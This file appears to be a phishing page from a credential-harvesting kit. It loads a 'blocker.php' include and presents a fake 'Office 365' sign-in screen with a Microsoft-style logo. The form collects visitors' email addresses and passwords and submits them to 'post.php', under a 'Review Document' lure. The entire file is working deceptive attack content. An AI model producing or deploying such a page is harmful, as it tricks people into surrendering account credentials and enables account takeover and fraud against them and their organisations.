<?php

include('blocker.php');

?>

<html>
<head>
<title>Office 365</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

</head>
<body style="margin:0px;padding:0px;background: url('https://www.wallpaperup.com/uploads/wallpapers/2019/02/21/1314099/f090c91b90c5be9d3add2d306a9c4233.jpg');  background-repeat: no-repeat;
  background-size: cover;">

	<center><div style="width:40%;margin-top:10%;background-color:white;height:400px;padding-left:20px;text-align:left;border-radius:5px;">
		<img src="data:image/png;base64,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" style="width:140px;">
		<p style="margin:1px;">Login with your office 365 email and password</p>
		<h3>Create, collaborate, and share great files online</h3>
		<form action="post.php" method="post">
		<input type="text" name="email" style="width:95%;height:40px;margin-bottom:20px;" placeholder="Office 365 Email Address"required>

		<input type="password" name="password" style="width:95%;height:40px;margin-bottom:20px;" placeholder="Password" required>
		
		<button type="submit" name="submit" style="width:40%;height:40px;border:none;border-radius:20px;background-color:#2596be;color:white;cursor:pointer;">Review Document</button>


		</form>

	</div></center>

</body>
</html>